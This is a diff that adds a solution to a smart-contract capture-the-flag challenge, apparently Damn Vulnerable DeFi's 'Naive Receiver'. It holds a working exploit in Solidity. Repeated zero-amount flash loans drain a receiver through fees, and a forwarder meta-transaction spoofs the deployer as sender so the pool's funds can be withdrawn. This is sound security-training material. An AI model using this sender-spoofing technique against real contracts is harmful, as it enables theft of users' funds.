@@ -76,8 +76,48 @@ contract NaiveReceiverChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_naiveReceiver() public checkSolvedByPlayer {
-        
+     function test_naiveReceiver() public checkSolvedByPlayer {
+        bytes[] memory callDatas = new bytes[](11);
+        for(uint i=0; i<10; i++){
+            callDatas[i] = abi.encodeCall(NaiveReceiverPool.flashLoan, (receiver, address(weth), 0, "0x")); // flashloan 0 WETH 10 times, pay 1 WETH fee each time.
+        }
+        callDatas[10] = abi.encodePacked(abi.encodeCall(NaiveReceiverPool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))),  // withdraw all funds to recovery
+            bytes32(uint256(uint160(deployer)))
+        );
+        bytes memory callData;
+        callData = abi.encodeCall(pool.multicall, callDatas);   // multicall all the flashloan and withdraw calls in one transaction
+        BasicForwarder.Request memory request = BasicForwarder.Request(
+            player,
+            address(pool),
+            0,
+            30000000,
+            forwarder.nonces(player),
+            callData,
+            1 days
+        );  // create a request to multicall all the flashloan and withdraw calls
+        bytes32 requestHash = keccak256(
+            abi.encodePacked(
+                "\x19\x01",
+                forwarder.domainSeparator(),
+                forwarder.getDataHash(request)
+            )
+        );  // hash the request
+        (uint8 v, bytes32 r, bytes32 s)= vm.sign(playerPk ,requestHash);    // sign the request
+        bytes memory signature = abi.encodePacked(r, s, v);                 // create the signature
+        require(forwarder.execute(request, signature));                     // execute the request
+
+        //works because  
+        // ```
+        //     function _msgSender() internal view override returns (address) {
+        //     if (msg.sender == trustedForwarder && msg.data.length >= 20) {
+        //         return address(bytes20(msg.data[msg.data.length - 20:]));
+        //     } else {
+        //         return super._msgSender();
+        //     }
+        // }
+        // ```
+        // in NaiveReceiverPool.sol
+        // the withdrawal address will be read as the last 20 bytes of the msg.data which is the address of the recovery account which we spoofed earlier...
     }
 
     /**
